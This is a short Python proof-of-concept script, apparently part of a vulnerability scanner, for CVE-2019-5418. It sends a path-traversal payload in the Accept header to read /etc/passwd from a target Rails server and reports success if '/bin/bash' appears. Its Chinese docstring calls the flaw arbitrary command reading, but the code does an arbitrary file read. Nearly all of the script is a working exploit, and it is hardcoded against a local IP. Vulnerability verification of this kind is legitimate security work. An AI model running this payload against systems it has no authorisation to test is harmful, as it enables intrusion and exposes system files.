#!/usr/bin/env python3

'''
name: CVE-2019-5418漏洞可读取任意命令
description: CVE-2019-5418漏洞可读取任意命令,暂时仅限于Linux系统
'''

import time
import json

from app.lib.utils.request import request


class CVE_2019_5418_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
            'Accept': '../../../../../../../../etc/passwd{{'
        }
    def run(self):
        try:
            if not self.url.startswith("http") and not self.url.startswith("https"):
                self.url = "http://" + self.url
            check_req = request.get(self.url + '/robots', headers = self.headers)
            if check_req.status_code == 200 and '/bin/bash' in check_req.text:
                #print(check_req.text)
                print('存在CVE-2019-5418漏洞')
                return True
            else:
                print ('不存在CVE-2019-5418漏洞')
                return False
        except Exception as e:
            #print(e)
            print ('不存在CVE-2019-5418漏洞')
            return False

if  __name__ == "__main__":
    CVE_2019_5418 = CVE_2019_5418_BaseVerify('http://192.168.30.242:3000')
    CVE_2019_5418.run()


